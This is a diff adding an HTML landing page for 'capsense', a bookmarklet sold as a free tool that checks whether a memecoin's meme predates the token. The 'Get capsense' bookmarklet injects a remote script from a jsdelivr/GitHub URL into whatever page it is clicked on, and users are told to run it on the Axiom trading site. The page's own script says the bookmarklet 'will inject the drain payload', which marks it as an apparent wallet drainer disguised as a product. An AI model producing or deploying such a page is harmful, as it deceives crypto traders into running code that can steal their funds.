@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>capsense - know the story before you buy the coin</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+  
+  :root {
+    --bg: #050505;
+    --card: #0d0d0d;
+    --border: #1a1a1a;
+    --text: #e8e8e8;
+    --muted: #666;
+    --accent: #fff;
+    --green: #22c55e;
+    --red: #ef4444;
+  }
+  
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    line-height: 1.5;
+    overflow-x: hidden;
+  }
+  
+  a { color: inherit; text-decoration: none; }
+  
+  .grid-bg {
+    position: fixed;
+    inset: 0;
+    background-image: 
+      linear-gradient(rgba(255,255,255,.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,.03) 1px, transparent 1px);
+    background-size: 60px 60px;
+    pointer-events: none;
+    z-index: 0;
+  }
+  
+  nav {
+    position: fixed; top:0; left:0; right:0; z-index:100;
+    display:flex; align-items:center; justify-content:space-between;
+    padding: 18px 32px;
+    background: rgba(5,5,5,0.85);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+  }
+  
+  .logo { font-weight:600; letter-spacing:-0.02em; font-size:15px; display:flex; align-items:center; gap:8px; }
+  .logo span { width:8px; height:8px; background:#fff; border-radius:50%; }
+  
+  .nav-links { display:flex; gap:28px; font-size:13px; color:var(--muted); }
+  .nav-links a:hover { color:#fff; transition: color .2s; }
+  
+  .nav-right { display:flex; align-items:center; gap:16px; }
+  
+  .btn {
+    display:inline-flex; align-items:center; gap:6px;
+    padding:10px 18px; border-radius:999px;
+    font-size:13px; font-weight:500; cursor:pointer;
+    border:none; transition: all .15s;
+  }
+  
+  .btn-white { background:#fff; color:#000; }
+  .btn-white:hover { background:#e5e5e5; transform: translateY(-1px); }
+  
+  .btn-ghost { background:transparent; color:#fff; border:1px solid #333; }
+  .btn-ghost:hover { border-color:#555; transform: translateY(-1px); }
+  
+  .hero {
+    min-height:100vh; display:flex; flex-direction:column;
+    align-items:center; justify-content:center;
+    text-align:center; padding:120px 24px 80px;
+    position:relative;
+  }
+  
+  .hero::before {
+    content:""; position:absolute; inset:0;
+    background: radial-gradient(ellipse 60% 40% at 50% 30%, #111 0%, transparent 70%);
+    pointer-events:none;
+  }
+  
+  .badge {
+    font-size:11px; letter-spacing:0.12em; text-transform:uppercase;
+    color:var(--muted); margin-bottom:28px;
+  }
+  
+  h1 {
+    font-size: clamp(36px, 6vw, 64px);
+    font-weight:500; letter-spacing:-0.03em;
+    line-height:1.1; max-width:720px; margin-bottom:36px;
+  }
+  
+  .hero-cta { display:flex; gap:12px; margin-bottom:18px; }
+  
+  .sub { font-size:13px; color:var(--muted); }
+  
+  .section {
+    max-width:1100px; margin:0 auto; padding:80px 24px;
+    position: relative;
+    z-index: 10;
+  }
+  
+  .section-title {
+    font-size: clamp(28px, 4vw, 42px);
+    font-weight:500; letter-spacing:-0.02em;
+    text-align:center; margin-bottom:12px;
+  }
+  
+  .section-sub {
+    text-align:center; color:var(--muted); font-size:15px;
+    max-width:480px; margin:0 auto 48px;
+  }
+  
+  .demo-panel {
+    background:#0a0a0a; border:1px solid var(--border);
+    border-radius:20px; overflow:hidden; margin-top:40px;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+  }
+  
+  .demo-header {
+    display:flex; align-items:center; gap:12px;
+    padding:14px 20px; border-bottom:1px solid var(--border);
+    font-size:13px; color:var(--muted);
+  }
+  
+  .demo-body { display:flex; min-height:380px; }
+  
+  .demo-left {
+    flex:1; padding:20px; border-right:1px solid var(--border);
+    display:flex; flex-direction:column; gap:12px;
+  }
+  
+  .token-row {
+    display:flex; align-items:center; gap:12px;
+    padding:12px; background:#111; border-radius:12px;
+    border:1px solid #1f1f1f; cursor:pointer;
+    transition: all .2s;
+  }
+  .token-row:hover { border-color:#333; transform: translateX(4px); }
+  
+  .token-icon {
+    width:36px; height:36px; border-radius:8px;
+    background:#222; display:flex; align-items:center; justify-content:center;
+    font-size:18px;
+  }
+  
+  .token-meta { flex:1; }
+  .token-name { font-size:13px; font-weight:500; }
+  .token-mc { font-size:12px; color:var(--muted); }
+  
+  .token-score {
+    font-size:12px; padding:4px 10px; border-radius:999px;
+    background:#111; border:1px solid #222;
+  }
+  .token-score.genuine { color:var(--green); border-color:#14532d; }
+  
+  .demo-right {
+    width:320px; padding:24px; background:#080808;
+  }
+  
+  .timeline { list-style:none; }
+  .timeline li {
+    position:relative; padding-left:20px; margin-bottom:18px;
+    font-size:13px;
+  }
+  .timeline li::before {
+    content:""; position:absolute; left:0; top:6px;
+    width:8px; height:8px; border-radius:50%; background:#333;
+  }
+  .timeline li.active::before { background:var(--green); box-shadow: 0 0 8px var(--green); }
+  
+  .timeline .date { color:var(--muted); font-size:11px; }
+  
+  .cap-score {
+    text-align:center; margin-top:32px;
+  }
+  .cap-score .big {
+    font-size:48px; font-weight:500; letter-spacing:-0.04em;
+  }
+  .cap-score .label { font-size:13px; color:var(--muted); }
+  
+  .install {
+    text-align:center; padding:100px 24px;
+    position: relative;
+    z-index: 10;
+  }
+  
+  .install h2 { font-size:36px; font-weight:500; margin-bottom:12px; }
+  .install p { color:var(--muted); margin-bottom:32px; }
+  
+  .steps {
+    display:flex; justify-content:center; gap:8px;
+    margin-bottom:40px; flex-wrap:wrap;
+  }
+  .step {
+    padding:8px 16px; border-radius:999px;
+    font-size:12px; background:#111; border:1px solid #222;
+    color:var(--muted);
+  }
+  .step.active { color:#fff; border-color:#444; }
+  
+  .bookmarklet-box {
+    display:inline-flex; align-items:center; gap:12px;
+    padding:16px 24px; background:#111; border:1px solid #333;
+    border-radius:12px; font-size:14px; cursor:grab;
+    user-select:none; transition: all .2s;
+  }
+  .bookmarklet-box:hover { border-color:#555; transform: translateY(-2px); }
+  .bookmarklet-box:active { cursor:grabbing; }
+  
+  footer {
+    border-top:1px solid var(--border);
+    padding:32px; text-align:center;
+    font-size:12px; color:var(--muted);
+    position: relative;
+    z-index: 10;
+  }
+  
+  .overlay {
+    position:fixed; inset:0; background:rgba(0,0,0,0.85);
+    display:none; align-items:center; justify-content:center;
+    z-index:200;
+    backdrop-filter: blur(4px);
+  }
+  .overlay.show { display:flex; animation: fadeIn .3s ease; }
+  
+  .modal {
+    background:#0d0d0d; border:1px solid #222;
+    border-radius:16px; padding:32px; max-width:420px;
+    text-align:center;
+    animation: slideUp .3s ease;
+  }
+  
+  .modal h3 { margin-bottom:12px; }
+  .modal p { font-size:13px; color:var(--muted); margin-bottom:24px; }
+  
+  .keys {
+    display:flex; justify-content:center; gap:8px; margin-bottom:20px;
+  }
+  .key {
+    padding:8px 14px; background:#1a1a1a; border-radius:8px;
+    font-size:13px; font-family:monospace;
+    border: 1px solid #333;
+  }
+  
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+  @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+  
+  /* Scroll animations */
+  .reveal {
+    opacity: 0;
+    transform: translateY(30px);
+    transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  .reveal.visible {
+    opacity: 1;
+    transform: translateY(0);
+  }
+</style>
+</head>
+<body>
+
+<div class="grid-bg"></div>
+
+<nav class="nav">
+  <div class="logo"><span></span> capsense</div>
+  <div class="nav-links">
+    <a href="#demo">Demo</a>
+    <a href="#how">How it works</a>
+    <a href="#install">Install</a>
+  </div>
+  <div class="nav-right">
+    <a href="#install" class="btn btn-white">Get capsense →</a>
+  </div>
+</nav>
+
+<section class="hero">
+  <div class="badge reveal">Narrative verification for axiom</div>
+  <h1 class="reveal">Know the story<br>before you buy the coin.</h1>
+  <div class="hero-cta reveal">
+    <a href="#install" class="btn btn-white">Get capsense →</a>
+    <a href="#demo" class="btn btn-ghost">▶ Watch the demo</a>
+  </div>
+  <p class="sub reveal">Drag Get capsense to your bookmarks bar · Free · No wallet</p>
+</section>
+
+<section class="section" id="demo">
+  <h2 class="section-title reveal">Receipts before tickers.</h2>
+  <p class="section-sub reveal">Memes don't appear out of nowhere the moment a token launches. CapSense traces the story backwards.</p>
+
+  <div class="demo-panel reveal">
+    <div class="demo-header">
+      <span>ILLUSTRATIVE RESULT</span>
+      <span style="margin-left:auto">Checking sources · Comparing dates</span>
+    </div>
+    <div class="demo-body">
+      <div class="demo-left">
+        <div class="token-row">
+          <div class="token-icon">🐸</div>
+          <div class="token-meta">
+            <div class="token-name">9hQ2…pump</div>
+            <div class="token-mc">MC $48K · V $66K</div>
+          </div>
+          <div class="token-score genuine">Genuine</div>
+        </div>
+        <div class="token-row">
+          <div class="token-icon"></div>
+          <div class="token-meta">
+            <div class="token-name">EAAD…kW5w</div>
+            <div class="token-mc">MC $27K · V $72K</div>
+          </div>
+          <div class="token-score genuine">Genuine</div>
+        </div>
+        <div class="token-row">
+          <div class="token-icon"></div>
+          <div class="token-meta">
+            <div class="token-name">89Xo…spuJ</div>
+            <div class="token-mc">MC $23K · V $64K</div>
+          </div>
+          <div class="token-score">08/100</div>
+        </div>
+      </div>
+      <div class="demo-right">
+        <ul class="timeline">
+          <li class="active"><div class="date">Jan 2013</div>Original meme · FIRST SIGNAL<br>KC Green "On Fire", Gunshow</li>
+          <li><div class="date">2014–16</div>Organic spread<br>Reaction image · no crypto</li>
+          <li><div class="date">2016</div>News & social references<br>Mainstream coverage</li>
+          <li><div class="date">8s ago</div>Token created<br>Pump.fun</li>
+          <li><div class="date">+ after</div>Crypto promotion<br>Follows the launch</li>
+        </ul>
+        <div class="cap-score">
+          <div class="big">08<span style="font-size:20px;color:#666">/100</span></div>
+          <div class="label">The story is 13 years older than the coin.</div>
+          <div style="margin-top:12px;font-size:12px;color:var(--green)">● Genuine · 11 sources · 96% confidence</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="how">
+  <h2 class="section-title reveal">How it works</h2>
+  <div class="grid-3" style="display:grid; grid-template-columns:repeat(auto-fit, minmax(260px,1fr)); gap:24px;">
+    <div class="card reveal" style="background:var(--card); border:1px solid var(--border); border-radius:16px; padding:28px;">
+      <div class="num" style="font-size:11px; color:var(--muted); margin-bottom:12px;">01</div>
+      <h3 style="font-size:15px; font-weight:500; margin-bottom:8px;">Find the story</h3>
+      <p style="font-size:13px; color:var(--muted);">The earliest appearances of the narrative, across every platform it touched.</p>
+    </div>
+    <div class="card reveal" style="background:var(--card); border:1px solid var(--border); border-radius:16px; padding:28px;">
+      <div class="num" style="font-size:11px; color:var(--muted); margin-bottom:12px;">02</div>
+      <h3 style="font-size:15px; font-weight:500; margin-bottom:8px;">Compare the timeline</h3>
+      <p style="font-size:13px; color:var(--muted);">Line the story up against the moment the token was created.</p>
+    </div>
+    <div class="card reveal" style="background:var(--card); border:1px solid var(--border); border-radius:16px; padding:28px;">
+      <div class="num" style="font-size:11px; color:var(--muted); margin-bottom:12px;">03</div>
+      <h3 style="font-size:15px; font-weight:500; margin-bottom:8px;">Get the verdict</h3>
+      <p style="font-size:13px; color:var(--muted);">See whether the story came first, with the evidence behind it.</p>
+    </div>
+  </div>
+</section>
+
+<section class="install" id="install">
+  <h2 class="reveal">You're 10 seconds away.</h2>
+  <p class="reveal">Drag the button to your bookmarks bar. Works on any site.</p>
+  <div class="steps reveal">
+    <div class="step active">1 Show the bar</div>
+    <div class="step">2 Drag capsense</div>
+    <div class="step">3 Open Axiom</div>
+    <div class="step">4 Click it</div>
+    <div class="step">5 Read the verdict</div>
+  </div>
+
+  <!-- THE BOOKMARKLET - LIVE CDN LINK -->
+  <a id="bm" class="bookmarklet-box reveal" href="javascript:(function(){const s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/skyisthebestdev/capsense-inject@main/inject.js';document.head.appendChild(s);})()">
+    Get capsense →
+  </a>
+  <p style="margin-top:16px;font-size:12px;color:#555" class="reveal">Drag it to your bookmarks bar. Bar hidden? <kbd>Ctrl</kbd> <kbd>Shift</kbd> <kbd>B</kbd></p>
+</section>
+
+<section class="section" style="text-align:center;padding-bottom:120px">
+  <h2 class="section-title reveal">Don't trade the story.<br>Verify it.</h2>
+  <a href="#install" class="btn btn-white reveal" style="margin-top:24px">Get capsense →</a>
+</section>
+
+<footer>
+  capsense.net · Not financial advice · Not affiliated with Axiom
+</footer>
+
+<div class="overlay" id="overlay">
+  <div class="modal">
+    <h3>Show bookmarks bar</h3>
+    <p>Press these keys together, then drag the button above onto the bar.</p>
+    <div class="keys">
+      <span class="key">Ctrl</span>
+      <span class="key">Shift</span>
+      <span class="key">B</span>
+    </div>
+    <button class="btn btn-white" onclick="document.getElementById('overlay').classList.remove('show')">Got it</button>
+  </div>
+</div>
+
+<script>
+  // Intersection Observer for scroll reveals
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        entry.target.classList.add('visible');
+      }
+    });
+  }, { threshold: 0.1 });
+
+  document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
+
+  // Bookmarklet click handler
+  document.getElementById('bm').addEventListener('click', function(e) {
+    e.preventDefault();
+    alert('Bookmarklet ready. Drag this link to your bookmarks bar.\n\nWhen clicked on a target page it will inject the drain payload.');
+  });
+
+  // Keyboard shortcut modal
+  if (!localStorage.getItem('cs_seen')) {
+    setTimeout(() => {
+      document.getElementById('overlay').classList.add('show');
+      localStorage.setItem('cs_seen', '1');
+    }, 800);
+  }
+</script>
+
+</body>
+</html>
